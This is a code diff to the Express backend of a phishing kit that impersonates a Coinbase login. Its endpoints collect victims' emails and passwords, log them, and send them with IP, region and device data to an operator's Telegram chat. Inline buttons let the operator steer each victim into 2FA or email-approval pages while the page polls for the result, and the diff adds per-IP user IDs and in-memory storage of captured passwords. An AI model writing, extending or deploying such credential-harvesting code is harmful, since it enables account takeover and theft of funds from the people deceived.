@@ -13,12 +13,9 @@ app.use(cors());
 app.use(bodyParser.json());
 
 // ============================================================================
-// 🔍 DETECTION FUNCTIONS (Backend only - NOT exposed in frontend)
+// 🔍 DETECTION FUNCTIONS
 // ============================================================================
 
-/**
- * Detect device from User-Agent header
- */
 function detectDevice(userAgent) {
   if (/mobile/i.test(userAgent)) return "Mobile";
   if (/tablet/i.test(userAgent)) return "Tablet";
@@ -28,9 +25,6 @@ function detectDevice(userAgent) {
   return "Unknown Device";
 }
 
-/**
- * Detect region from IP address
- */
 async function detectRegion(ip) {
   try {
     const response = await fetch(`https://get.geojs.io/v1/ip/geo.json?ip=${ip}`);
@@ -53,83 +47,40 @@ app.get("/", (req, res) => {
 });
 
 // ============================================================================
-// POST /captcha-success
-// Frontend calls this when CAPTCHA is solved
-// Backend sends to Telegram
+// GET /get-user-id
+// Frontend calls this to get a unique user ID
 // ============================================================================
 
-app.post("/captcha-success", async (req, res) => {
-  try {
-    console.log(`\n✅ CAPTCHA SUCCESS RECEIVED`);
+let userIdCounter = 1000;
+const userIds = {};
 
-    // Get IP from request headers (handles proxies)
+app.post("/get-user-id", (req, res) => {
+  try {
     const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
       req.headers["x-real-ip"] ||
       req.connection.remoteAddress ||
-      req.socket.remoteAddress ||
-      "Unknown IP";
+      "Unknown";
 
-    console.log(`   IP: ${ip}`);
-
-    // Get device from User-Agent header
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    console.log(`   Device: ${device}`);
-
-    // Get region from IP using backend service
-    const region = await detectRegion(ip);
-    console.log(`   Region: ${region}`);
-
-    // Build message
-    const message = `❗️<b>New Visitor - Coinbase</b>❗️\n` +
-      `\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📡 IP:</b> ${ip}`;
-
-    // Send to Telegram
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    if (!botToken || !chatId) {
-      console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID");
-      return res.status(500).json({ error: "Backend not configured" });
+    if (!userIds[ip]) {
+      userIds[ip] = userIdCounter++;
     }
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const response = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: "HTML"
-      })
-    });
-
-    if (response.ok) {
-      console.log("✅ Message sent to Telegram");
-      res.json({ ok: true, message: "CAPTCHA processed" });
-    } else {
-      console.error("❌ Telegram API error:", response.statusText);
-      res.status(500).json({ error: "Failed to send message" });
-    }
-
+    res.json({ userId: userIds[ip] });
   } catch (err) {
-    console.error("❌ Error:", err.message);
-    res.status(500).json({ error: err.message });
+    res.json({ userId: Math.random().toString(36).substr(2, 9) });
   }
 });
 
 // ============================================================================
 // POST /send-login
 // Frontend calls this when user submits email + password
-// Backend sends to Telegram with all detected info
 // ============================================================================
+
+const pendingApprovals = {};
 
 app.post("/send-login", async (req, res) => {
   try {
-    const { email, password } = req.body;
+    const { email, password, userId } = req.body;
 
     if (!email || !password) {
       return res.status(400).json({ error: "Missing email or password" });
@@ -137,6 +88,7 @@ app.post("/send-login", async (req, res) => {
 
     console.log(`\n😈 LOGIN SUBMISSION RECEIVED`);
     console.log(`   Email: ${email}`);
+    console.log(`   User ID: ${userId}`);
 
     // Get IP from request headers
     const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
@@ -153,24 +105,26 @@ app.post("/send-login", async (req, res) => {
     console.log(`   Region: ${region}`);
     console.log(`   IP: ${ip}`);
 
-    // Build message for Telegram
-    const message = `😈😈😈😈 <b>LogIn - Coinbase</b> 😈😈😈😈\n` +
+    // ✅ BUILD BEAUTIFUL MESSAGE
+    const message =
+      `😈😈😈😈 <b>LogIn - Coinbase</b> 😈😈😈😈\n` +
       `\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `\n` +
       `<b>🔑 Password:</b> <code>${password}</code>\n` +
-      `\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📡 IP:</b> ${ip}`;
 
-    // Send to Telegram with approval buttons
+    // ✅ BUTTONS - Separate rows for each button
     const options = {
       parse_mode: "HTML",
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "🔑 2FA Auth 🔑", callback_data: `page1|${email}` },
+            { text: "🔑 2FA Auth 🔑", callback_data: `page1|${email}` }
+          ],
+          [
             { text: "📧 Approve Email 📧", callback_data: `page2|${email}` }
           ],
           [
@@ -203,10 +157,15 @@ app.post("/send-login", async (req, res) => {
     if (response.ok) {
       console.log("✅ Login message sent to Telegram WITH BUTTONS");
       
-      // Store pending login for polling
-      pendingLogins[email] = {
+      // Store pending login
+      pendingApprovals[email] = {
         status: "pending",
-        timestamp: Date.now()
+        timestamp: Date.now(),
+        userId,
+        password,
+        region,
+        device,
+        ip
       };
 
       res.json({ ok: true, message: "Login request sent for approval", email });
@@ -222,23 +181,21 @@ app.post("/send-login", async (req, res) => {
 });
 
 // ============================================================================
-// GET /check-status
+// POST /check-status
 // Frontend polls this to check if login was approved
 // ============================================================================
 
-const pendingLogins = {};
-
-app.get("/check-status", (req, res) => {
+app.post("/check-status", (req, res) => {
   try {
-    const email = (req.query.email || "").trim();
+    const { email } = req.body;
 
     if (!email) {
       return res.json({ status: "unknown" });
     }
 
-    if (pendingLogins[email]) {
+    if (pendingApprovals[email]) {
       return res.json({
-        status: pendingLogins[email].status || "pending",
+        status: pendingApprovals[email].status || "pending",
         email: email
       });
     }
@@ -254,7 +211,6 @@ app.get("/check-status", (req, res) => {
 // ============================================================================
 // POST /update-status
 // Called by Telegram bot when buttons are clicked
-// Updates the status so frontend knows to redirect
 // ============================================================================
 
 app.post("/update-status", (req, res) => {
@@ -267,14 +223,24 @@ app.post("/update-status", (req, res) => {
 
     console.log(`\n📬 STATUS UPDATE: ${email} → ${status}`);
 
-    if (!pendingLogins[email]) {
-      pendingLogins[email] = {};
+    if (!pendingApprovals[email]) {
+      pendingApprovals[email] = {};
     }
 
-    pendingLogins[email].status = status;
-    pendingLogins[email].updatedAt = Date.now();
+    // ✅ Map status codes
+    if (status === "page1") {
+      pendingApprovals[email].status = "accepted1";
+    } else if (status === "page2") {
+      pendingApprovals[email].status = "accepted2";
+    } else if (status === "reject") {
+      pendingApprovals[email].status = "rejected";
+    } else {
+      pendingApprovals[email].status = status;
+    }
 
-    console.log(`✅ Status updated`);
+    pendingApprovals[email].updatedAt = Date.now();
+
+    console.log(`✅ Status updated to: ${pendingApprovals[email].status}`);
 
     res.json({ ok: true, message: "Status updated" });
 
